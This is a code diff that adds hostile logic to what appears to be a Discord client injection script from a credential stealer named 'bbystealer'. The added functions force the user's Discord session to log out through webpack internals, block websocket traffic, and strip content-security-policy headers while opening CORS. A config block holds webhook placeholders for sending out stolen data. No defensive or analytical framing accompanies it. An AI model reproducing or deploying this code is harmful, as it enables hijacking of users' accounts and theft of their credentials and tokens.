@@ -5,6 +5,29 @@ const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
+
+function FirstTime() {
+    if (!fs.existsSync(path.join(__dirname, "bbystealer"))) return true;
+    fs.rmdirSync(path.join(__dirname, "bbystealer"));
+    return BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', true).then(response => {}), ![];
+}
+
+
+session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
+    if (FirstTime()) details["url"].startsWith("wss://") ? callback({
+        'cancel': true
+    }) : callback( {
+        'cancel': false
+    });
+}), session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+    delete details["responseHeaders"]["content-security-policy"], delete details["responseHeaders"]["content-security-policy-report-only"], callback({
+        'responseHeaders': {
+            ...details["responseHeaders"],
+            'Access-Control-Allow-Headers': '*'
+        }
+    });
+});
+   
 const config = {
   webhook: '%WEBHOOK%', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
